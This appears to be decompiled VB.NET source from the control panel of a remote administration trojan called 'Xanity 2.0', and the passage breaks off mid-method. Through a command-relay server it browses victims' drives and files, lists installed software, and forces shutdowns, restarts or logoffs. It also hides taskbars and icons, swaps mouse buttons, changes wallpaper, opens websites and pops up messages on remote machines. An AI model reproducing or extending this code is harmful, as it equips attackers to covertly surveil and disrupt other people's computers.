Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Xanity_2._0.My
Imports Xanity_2._0.My.Resources

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class SystemInformation
        Inherits Form
        ' Methods
        Public Sub New()
            SystemInformation.__ENCAddToList(Me)
            Me.server = New API
            Me.url = ""
            Me.nam = Nothing
            Me.shareclient = New WebClient
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = SystemInformation.__ENCList
            SyncLock list
                If (SystemInformation.__ENCList.Count = SystemInformation.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (SystemInformation.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = SystemInformation.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                SystemInformation.__ENCList.Item(index) = SystemInformation.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    SystemInformation.__ENCList.RemoveRange(index, (SystemInformation.__ENCList.Count - index))
                    SystemInformation.__ENCList.Capacity = SystemInformation.__ENCList.Count
                End If
                SystemInformation.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__10(ByVal sender As Object, ByVal e As EventArgs)
            Me.PasteFileHere
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__11(ByVal sender As Object, ByVal e As EventArgs)
            Me.PasteFileHere
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__12(ByVal sender As Object, ByVal e As EventArgs)
            Me.MoveFileHere
        End Sub

        <DebuggerStepThrough, CompilerGenerated> _
        Private Sub _Lambda$__13(ByVal sender As Object, ByVal e As EventArgs)
            Me.MoveFileHere
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__14(ByVal sender As Object, ByVal e As EventArgs)
            Me.MoveFileHere
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__3(ByVal sender As Object, ByVal e As EventArgs)
            Me.PasteHereItem_Click
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__4(ByVal sender As Object, ByVal e As EventArgs)
            Me.PasteHereItem_Click
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__5(ByVal sender As Object, ByVal e As EventArgs)
            Me.PasteHereItem_Click
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__6(ByVal sender As Object, ByVal e As EventArgs)
            Me.MoveHereItem_Click
        End Sub

        <DebuggerStepThrough, CompilerGenerated> _
        Private Sub _Lambda$__7(ByVal sender As Object, ByVal e As EventArgs)
            Me.MoveHereItem_Click
        End Sub

        <DebuggerStepThrough, CompilerGenerated> _
        Private Sub _Lambda$__8(ByVal sender As Object, ByVal e As EventArgs)
            Me.MoveHereItem_Click
        End Sub

        <DebuggerStepThrough, CompilerGenerated> _
        Private Sub _Lambda$__9(ByVal sender As Object, ByVal e As EventArgs)
            Me.PasteFileHere
        End Sub

        Public Sub Add(ByVal software As String)
            software = software.Replace((software.Split(New Char() { "|"c })(0) & "|"), "")
            Dim num2 As Integer = MyProject.Forms.Form1.CountCharacter(software, "|"c)
            Dim i As Integer = 0
            Do While (i <= num2)
                Me.ListBox_Software.Items.Add(software.Split(New Char() { "|"c })(i))
                i += 1
            Loop
            Me.FlatStatusBar_IS.Text = ("Installed Software: " & software.Split(New Char() { "|"c })(0))
        End Sub

        Public Sub AddDrives(ByVal [text] As String)
            Try 
                Dim num2 As Integer = (MyProject.Forms.Form1.CountCharacter([text], "|"c) - 1)
                Dim i As Integer = 0
                Do While (i <= num2)
                    Me.cb_drive.Items.Add([text].Split(New Char() { "|"c })(i))
                    i += 1
                Loop
                Me.FlatStatusBar1.Text = "Drives received successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub Addfiles(ByVal txt As String)
            Try 
                Me.path = txt.Split(New Char() { "|"c })(0)
                Me.tb_path.Text = Me.path.Remove(0, 3)
                txt = txt.Replace((txt.Split(New Char() { "|"c })(0) & "|"), "")
                Dim box As New TextBox With { _
                    .Text = txt _
                }
                Dim str2 As String
                For Each str2 In box.Lines
                    Dim strArray As String() = str2.Split(New Char() { "|"c })
                    Dim text As String = strArray(0)
                    Dim str3 As String = strArray(1)
                    Dim str4 As String = strArray(2)
                    Dim str5 As String = strArray(3)
                    Dim str6 As String = strArray(4)
                    Select Case str6
                        Case "1"
                            Dim item As ListViewItem = Me.ListView1.Items.Add([text], 0)
                            item.SubItems.Add(str3)
                            item.SubItems.Add(str4)
                            item.SubItems.Add(str5)
                            item.SubItems.Add(str6)
                            item = Nothing
                            Exit Select
                        Case "0"
                            If ([text].Contains(".exe") Or [text].Contains(".EXE")) Then
                                Dim item2 As ListViewItem = Me.ListView1.Items.Add([text], 1)
                                item2.SubItems.Add(str3)
                                item2.SubItems.Add(str4)
                                item2.SubItems.Add(str5)
                                item2.SubItems.Add(str6)
                                item2 = Nothing
                            ElseIf ((((([text].Contains(".xls") Or [text].Contains(".XLS")) Or [text].Contains(".xlt")) Or [text].Contains(".XLT")) Or [text].Contains(".XLTX")) Or [text].Contains(".xltx")) Then
                                Dim item3 As ListViewItem = Me.ListView1.Items.Add([text], 3)
                                item3.SubItems.Add(str3)
                                item3.SubItems.Add(str4)
                                item3.SubItems.Add(str5)
                                item3.SubItems.Add(str6)
                                item3 = Nothing
                            ElseIf ((([text].Contains(".swf") Or [text].Contains(".SWF")) Or [text].Contains(".flv")) Or [text].Contains(".FLV")) Then
                                Dim item4 As ListViewItem = Me.ListView1.Items.Add([text], 4)
                                item4.SubItems.Add(str3)
                                item4.SubItems.Add(str4)
                                item4.SubItems.Add(str5)
                                item4.SubItems.Add(str6)
                                item4 = Nothing
                            ElseIf ((([text].Contains(".htm") Or [text].Contains(".HTM")) Or [text].Contains(".html")) Or [text].Contains(".HTML")) Then
                                Dim item5 As ListViewItem = Me.ListView1.Items.Add([text], 5)
                                item5.SubItems.Add(str3)
                                item5.SubItems.Add(str4)
                                item5.SubItems.Add(str5)
                                item5.SubItems.Add(str6)
                                item5 = Nothing
                            ElseIf ([text].Contains(".ai") Or [text].Contains(".AI")) Then
                                Dim item6 As ListViewItem = Me.ListView1.Items.Add([text], 6)
                                item6.SubItems.Add(str3)
                                item6.SubItems.Add(str4)
                                item6.SubItems.Add(str5)
                                item6.SubItems.Add(str6)
                                item6 = Nothing
                            ElseIf ((((((([text].Contains(".aac") Or [text].Contains(".AAC")) Or [text].Contains(".m4a")) Or [text].Contains(".M4A")) Or [text].Contains(".mp3")) Or [text].Contains(".MP3")) Or [text].Contains(".wav")) Or [text].Contains(".WAV")) Then
                                Dim item7 As ListViewItem = Me.ListView1.Items.Add([text], 7)
                                item7.SubItems.Add(str3)
                                item7.SubItems.Add(str4)
                                item7.SubItems.Add(str5)
                                item7.SubItems.Add(str6)
                                item7 = Nothing
                            ElseIf ([text].Contains(".pdf") Or [text].Contains(".PDF")) Then
                                Dim item8 As ListViewItem = Me.ListView1.Items.Add([text], 8)
                                item8.SubItems.Add(str3)
                                item8.SubItems.Add(str4)
                                item8.SubItems.Add(str5)
                                item8.SubItems.Add(str6)
                                item8 = Nothing
                            ElseIf ([text].Contains(".psd") Or [text].Contains(".PSD")) Then
                                Dim item9 As ListViewItem = Me.ListView1.Items.Add([text], 9)
                                item9.SubItems.Add(str3)
                                item9.SubItems.Add(str4)
                                item9.SubItems.Add(str5)
                                item9.SubItems.Add(str6)
                                item9 = Nothing
                            ElseIf ((((([text].Contains(".php") Or [text].Contains(".php3")) Or [text].Contains(".phtml")) Or [text].Contains(".PHP")) Or [text].Contains(".PHTML")) Or [text].Contains(".PHP3")) Then
                                Dim item10 As ListViewItem = Me.ListView1.Items.Add([text], 10)
                                item10.SubItems.Add(str3)
                                item10.SubItems.Add(str4)
                                item10.SubItems.Add(str5)
                                item10.SubItems.Add(str6)
                                item10 = Nothing
                            ElseIf ((([text].Contains(".ppt") Or [text].Contains(".PPT")) Or [text].Contains(".PPTX")) Or [text].Contains(".pptx")) Then
                                Dim item11 As ListViewItem = Me.ListView1.Items.Add([text], 11)
                                item11.SubItems.Add(str3)
                                item11.SubItems.Add(str4)
                                item11.SubItems.Add(str5)
                                item11.SubItems.Add(str6)
                                item11 = Nothing
                            ElseIf ((((((([text].Contains(".sln") Or [text].Contains(".SLN")) Or [text].Contains(".user")) Or [text].Contains(".USER")) Or [text].Contains(".PDB")) Or [text].Contains(".pdb")) Or [text].Contains(".RESX")) Or [text].Contains(".resx")) Then
                                Dim item12 As ListViewItem = Me.ListView1.Items.Add([text], 12)
                                item12.SubItems.Add(str3)
                                item12.SubItems.Add(str4)
                                item12.SubItems.Add(str5)
                                item12.SubItems.Add(str6)
                                item12 = Nothing
                            ElseIf ((([text].Contains(".doc") Or [text].Contains(".DOC")) Or [text].Contains(".docx")) Or [text].Contains(".DOCX")) Then
                                Dim item13 As ListViewItem = Me.ListView1.Items.Add([text], 13)
                                item13.SubItems.Add(str3)
                                item13.SubItems.Add(str4)
                                item13.SubItems.Add(str5)
                                item13.SubItems.Add(str6)
                                item13 = Nothing
                            ElseIf ((([text].Contains(".xaml") Or [text].Contains(".XAML")) Or [text].Contains(".xml")) Or [text].Contains(".XML")) Then
                                Dim item14 As ListViewItem = Me.ListView1.Items.Add([text], 14)
                                item14.SubItems.Add(str3)
                                item14.SubItems.Add(str4)
                                item14.SubItems.Add(str5)
                                item14.SubItems.Add(str6)
                                item14 = Nothing
                            ElseIf ([text].Contains(".bfc") Or [text].Contains(".BFC")) Then
                                Dim item15 As ListViewItem = Me.ListView1.Items.Add([text], 15)
                                item15.SubItems.Add(str3)
                                item15.SubItems.Add(str4)
                                item15.SubItems.Add(str5)
                                item15.SubItems.Add(str6)
                                item15 = Nothing
                            ElseIf ([text].Contains(".sql") Or [text].Contains(".SQL")) Then
                                Dim item16 As ListViewItem = Me.ListView1.Items.Add([text], &H10)
                                item16.SubItems.Add(str3)
                                item16.SubItems.Add(str4)
                                item16.SubItems.Add(str5)
                                item16.SubItems.Add(str6)
                                item16 = Nothing
                            ElseIf ([text].Contains(".pst") Or [text].Contains(".PST")) Then
                                Dim item17 As ListViewItem = Me.ListView1.Items.Add([text], &H12)
                                item17.SubItems.Add(str3)
                                item17.SubItems.Add(str4)
                                item17.SubItems.Add(str5)
                                item17.SubItems.Add(str6)
                                item17 = Nothing
                            ElseIf ((((((((((([text].Contains(".3gpp") Or [text].Contains(".3GPP")) Or [text].Contains(".avi")) Or [text].Contains(".AVI")) Or [text].Contains(".mp4")) Or [text].Contains(".MP4")) Or [text].Contains(".mov")) Or [text].Contains(".MOV")) Or [text].Contains(".mpeg")) Or [text].Contains(".MPEG")) Or [text].Contains(".WMA")) Or [text].Contains(".wma")) Then
                                Dim item18 As ListViewItem = Me.ListView1.Items.Add([text], &H13)
                                item18.SubItems.Add(str3)
                                item18.SubItems.Add(str4)
                                item18.SubItems.Add(str5)
                                item18.SubItems.Add(str6)
                                item18 = Nothing
                            ElseIf ((((([text].Contains(".zip") Or [text].Contains(".ZIP")) Or [text].Contains(".rar")) Or [text].Contains(".RAR")) Or [text].Contains(".tar.gz")) Or [text].Contains(".TAR.GZ")) Then
                                Dim item19 As ListViewItem = Me.ListView1.Items.Add([text], 20)
                                item19.SubItems.Add(str3)
                                item19.SubItems.Add(str4)
                                item19.SubItems.Add(str5)
                                item19.SubItems.Add(str6)
                                item19 = Nothing
                            ElseIf ((((((((((([text].Contains(".jpeg") Or [text].Contains(".JPEG")) Or [text].Contains(".jpg")) Or [text].Contains(".JPG")) Or [text].Contains(".gif")) Or [text].Contains(".GIF")) Or [text].Contains(".bmp")) Or [text].Contains(".BMP")) Or [text].Contains(".png")) Or [text].Contains(".PNG")) Or [text].Contains(".ico")) Or [text].Contains(".ICO")) Then
                                Dim item20 As ListViewItem = Me.ListView1.Items.Add([text], &H15)
                                item20.SubItems.Add(str3)
                                item20.SubItems.Add(str4)
                                item20.SubItems.Add(str5)
                                item20.SubItems.Add(str6)
                                item20 = Nothing
                            ElseIf ((([text].Contains(".rb") Or [text].Contains(".RB")) Or [text].Contains(".py")) Or [text].Contains(".PY")) Then
                                Dim item21 As ListViewItem = Me.ListView1.Items.Add([text], &H16)
                                item21.SubItems.Add(str3)
                                item21.SubItems.Add(str4)
                                item21.SubItems.Add(str5)
                                item21.SubItems.Add(str6)
                                item21 = Nothing
                            ElseIf ((((((([text].Contains(".vb") Or [text].Contains(".VB")) Or [text].Contains(".cs")) Or [text].Contains(".CS")) Or [text].Contains(".BAT")) Or [text].Contains(".bat")) Or [text].Contains(".CMD")) Or [text].Contains(".cmd")) Then
                                Dim item22 As ListViewItem = Me.ListView1.Items.Add([text], 2)
                                item22.SubItems.Add(str3)
                                item22.SubItems.Add(str4)
                                item22.SubItems.Add(str5)
                                item22.SubItems.Add(str6)
                                item22 = Nothing
                            ElseIf ([text].Contains(".txt") Or [text].Contains(".TXT")) Then
                                Dim item23 As ListViewItem = Me.ListView1.Items.Add([text], &H18)
                                item23.SubItems.Add(str3)
                                item23.SubItems.Add(str4)
                                item23.SubItems.Add(str5)
                                item23.SubItems.Add(str6)
                                item23 = Nothing
                            Else
                                Dim item24 As ListViewItem = Me.ListView1.Items.Add([text], &H11)
                                item24.SubItems.Add(str3)
                                item24.SubItems.Add(str4)
                                item24.SubItems.Add(str5)
                                item24.SubItems.Add(str6)
                                item24 = Nothing
                            End If
                            Exit Select
                    End Select
                Next
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_changewp_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Change|" & Interaction.InputBox("Please insert a direct link to a .jpg!", "Change Wallpaper", "", -1, -1)), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Wallpaper changed!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_closecd_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("CloseCD", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "CD Tray closed!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_hidedi_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("HideIcons", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Icons hidden!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_hidetb_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("HideTaskbar", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Taskbar hidden!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_logoff_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("logout", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Computer will logoff!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_opencd_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("OpenCD", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "CD Tray opened!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_openweb_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Website|" & Interaction.InputBox("Please enter a Website to open!", "Open Website", "", -1, -1)), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Website opened!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_restart_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("restart", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Computer will restart!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_send_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "msg|", Me.rtb_prompt.Text, "|", Me.tb_title.Text, "|", Me.ComboBox1.Text, "|", Me.ComboBox2.Text }), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "MessageBox sent!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_showdi_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("ShowIcons", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Icons shown!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_showtb_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("ShowTaskbar", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Taskbar shown!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_shutdown_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("shutdown", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Computer will shutdown!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_speak_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Speak|" & Interaction.InputBox("Please insert a text to speak!", "Text to speak", "", -1, -1)), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Text spoken!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_startdiscomouse_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("StartDiscoMouse", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Disco Mouse started!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_stopdiscomouse_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("StopDiscoMouse", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Disco Mouse stopped!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_swap_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("SwapMouse", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Mouse Buttons swapped!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_test_Click(ByVal sender As Object, ByVal e As EventArgs)
            MessageBox.Show(Me.rtb_prompt.Text, Me.tb_title.Text, DirectCast(Conversions.ToInteger(Me.MessageBoxButton(Me.ComboBox1.Text)), MessageBoxButtons), DirectCast(Conversions.ToInteger(Me.MessageBoxIcn(Me.ComboBox2.Text)), MessageBoxIcon))
        End Sub

        Private Sub btn_undo_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("UndoMouse", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Mouse Buttons are normal!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub cb_drive_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.cb_drive.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("ListDrives", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_drives.txt")
                Me.d = New Thread(New ThreadStart(AddressOf Me.Check3))
                Me.d.Start
                Me.FlatStatusBar1.Text = "Drives received successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub cb_drive_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_files.txt"))
                Me.ListView1.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(Conversions.ToString(Operators.ConcatenateObject("Getfiles|", Me.cb_drive.SelectedItem)), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_files.txt")
                Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                Me.f.Start
                Me.FlatStatusBar1.Text = "Directory received successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub check()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWrite(AddressOf Me.Write), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Public Sub check2()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateAdd(AddressOf Me.Add), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Public Sub Check3()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateAdd(AddressOf Me.AddDrives), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Public Sub Check4()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateAddFiles(AddressOf Me.Addfiles), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
